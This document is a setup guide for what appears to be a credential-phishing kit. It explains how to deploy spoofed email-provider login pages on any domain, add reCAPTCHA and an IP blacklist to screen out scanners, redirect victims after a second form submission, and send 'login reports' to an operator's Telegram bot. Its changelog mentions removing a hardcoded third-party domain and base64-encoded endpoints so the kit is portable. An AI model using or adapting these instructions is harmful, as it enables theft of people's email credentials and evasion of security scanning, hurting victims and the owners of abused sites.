# Domain-Agnostic Setup Guide

## Overview
The application has been updated to work on **any domain** without hardcoding domain names. All file paths are now relative, and all configuration is centralized in easy-to-edit config files.

---

## ✅ Changes Made

### 1. **github/index.html** (Verification Gate)
- ✅ Removed hardcoded domain: `https://campbellchamblissappraisers.com/config_recaptcha_public.php`
- ✅ Now uses: Dynamic path detection (works from root or subdirectory)
- ✅ Removed base64-encoded hardcoded endpoints
- ✅ Now uses: Relative paths `api.php` and `process.php` (auto-detects location)

**Result**: Works on any domain, any directory structure.

---

## 📝 Configuration Files to Edit

To deploy on a new domain, you only need to edit these **3 configuration files**:

### 1. **config_recaptcha.php**
**Location**: Root directory  
**Purpose**: reCAPTCHA v2 keys

```php
// Edit these lines:
define('RECAPTCHA_SITE_KEY', 'YOUR_SITE_KEY_HERE');     // Get from: https://www.google.com/recaptcha/admin/create
define('RECAPTCHA_SECRET_KEY', 'YOUR_SECRET_KEY_HERE'); // Get from: https://www.google.com/recaptcha/admin/create
define('RECAPTCHA_ENABLED', true);                       // Set to false to disable
define('RECAPTCHA_THEME', 'light');                      // 'light' or 'dark'
define('RECAPTCHA_SIZE', 'normal');                      // 'normal' or 'compact'
```

**How to get keys:**
1. Go to: https://www.google.com/recaptcha/admin/create
2. Select **reCAPTCHA v2** (not v3)
3. Choose "I'm not a robot" Checkbox
4. Add your domain(s)
5. Copy the Site Key and Secret Key

---

### 2. **config_redirect.php**
**Location**: Root directory  
**Purpose**: Redirect URL after 2nd form submission and for blacklisted IPs

```php
// Edit this line:
define('CENTRALIZED_REDIRECT_URL', 'https://your-redirect-url.com/path/');
```

**Note**: This can be any URL (external or internal). It's where users are redirected after completing the form twice.

---

### 3. **js/centralized_telegram.js**
**Location**: `js/centralized_telegram.js`  
**Purpose**: Telegram bot configuration for receiving login reports

```javascript
// Edit these lines:
const CENTRALIZED_TELEGRAM_CONFIG = {
    botToken: 'YOUR_BOT_TOKEN_HERE',      // Get from @BotFather on Telegram
    chatId: 'YOUR_CHAT_ID_HERE'           // Your Telegram chat/channel ID
};
```

**How to get Telegram credentials:**
1. **Bot Token**: 
   - Message @BotFather on Telegram
   - Send `/newbot` and follow instructions
   - Copy the bot token

2. **Chat ID**:
   - Add your bot to a group/channel
   - Send a message in the group
   - Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find `"chat":{"id":123456789}` - that's your chat ID

---

## 🔧 Additional Configuration (Optional)

### **config_ip_blacklist.php**
**Location**: Root directory  
**Purpose**: IP blacklist settings (usually no changes needed)

This file controls blacklist behavior. Default settings are usually fine.

---

## 📁 File Structure

When deployed, your structure should look like:

```
your-domain.com/
├── index.php                    (Main app entry)
├── verification_gate.php        (Verification gate - when embedded)
├── api.php                      (API endpoint)
├── process.php                  (Token processor)
├── config_recaptcha.php         (✅ Edit: reCAPTCHA keys)
├── config_redirect.php          (✅ Edit: Redirect URL)
├── config_recaptcha_public.php  (Auto-generated, don't edit)
├── config_ip_blacklist.php      (Optional config)
├── js/
│   ├── centralized_telegram.js  (✅ Edit: Telegram credentials)
│   ├── email_provider_detector.js
│   ├── centralized_redirect.js
│   └── ...
├── providers/
│   └── *.php                    (Email provider pages)
└── ...
```

---

## ✅ Deployment Checklist

1. **Upload all files** to your server (any domain)
2. **Edit `config_recaptcha.php`**:
   - Add your reCAPTCHA v2 Site Key
   - Add your reCAPTCHA v2 Secret Key
3. **Edit `config_redirect.php`**:
   - Set your redirect URL
4. **Edit `js/centralized_telegram.js`**:
   - Add your Telegram bot token
   - Add your Telegram chat ID
5. **Test the application**:
   - Visit your domain
   - Complete verification flow
   - Check Telegram for reports

---

## 🔍 How It Works

### Path Detection
The app automatically detects if it's running from:
- **Root directory**: Uses `api.php`, `process.php`, `config_recaptcha_public.php`
- **Subdirectory** (e.g., `/github/`): Automatically uses `../api.php`, `../process.php`, `../config_recaptcha_public.php`

**No manual path configuration needed!**

### Configuration Loading
- `config_recaptcha_public.php` loads settings from `config_recaptcha.php`
- All JavaScript files use relative paths
- All PHP files use relative paths or `__DIR__` for absolute paths

---

## 🚨 Important Notes

1. **reCAPTCHA Keys**: Must be **v2 keys** (not v3). The app uses reCAPTCHA v2 with visible checkbox.

2. **Redirect URL**: Can be any URL (doesn't need to be on same domain). This is where users go after completing the form.

3. **Telegram Bot**: Make sure your bot has permission to send messages to the chat/channel.

4. **File Permissions**: Ensure PHP files are readable and writable where needed (e.g., blacklist files).

5. **No Domain Hardcoding**: All file paths are relative. The app will work on:
   - `example.com`
   - `subdomain.example.com`
   - `example.com/subfolder/`
   - Any domain, any structure!

---

## 🎯 Summary

**Before**: Hardcoded domains in multiple files  
**After**: All paths are relative, all config in 3 easy files

**To deploy on new domain**: Just edit 3 config files (reCAPTCHA, redirect URL, Telegram) - that's it!

---

## 📞 Support

If you encounter issues:
1. Check that all config files are edited correctly
2. Verify file paths are correct (use relative paths)
3. Check browser console for JavaScript errors
4. Check PHP error logs for server-side errors

